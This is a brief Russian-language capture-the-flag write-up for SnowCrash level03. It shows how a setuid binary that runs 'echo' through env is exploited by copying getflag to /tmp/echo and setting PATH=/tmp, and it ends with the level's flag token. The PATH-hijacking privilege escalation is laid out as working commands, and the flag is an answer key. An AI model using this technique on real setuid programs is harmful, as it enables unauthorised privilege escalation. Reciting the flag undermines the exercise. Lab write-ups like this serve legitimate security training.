    ls -la

Так так, какой то странный исполняемый файл level03, надо запускать

    level03@SnowCrash:~$ ./level03
    Exploit me

Посмотрим что в нем есть:

    cat level03
    
    strings level03

Много мусора, посмотрим что есть интересного

    usr/bin/env echo Exploit me;

Судя по всему там есть вызов system()

    ls -la
    
    -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
   
Судя по всему, запуская этот файл мы повышаем права до создателя этого файла

Похоже то что нам нужно??? Попробуем подменить echo на getflag.  Прописываем следующую команду, чтобы узнать где лежит исполняемый файл getflag

    which getflag

    /bin/getflag
    
Скопируем в tmp и назовем файл echo  

    cp /bin/getflag /tmp/echo
   
    PATH=/tmp
    
    ./level03
    
Получаем заветный флаг
    
    qi0maab88jeaj46qoumi7maus
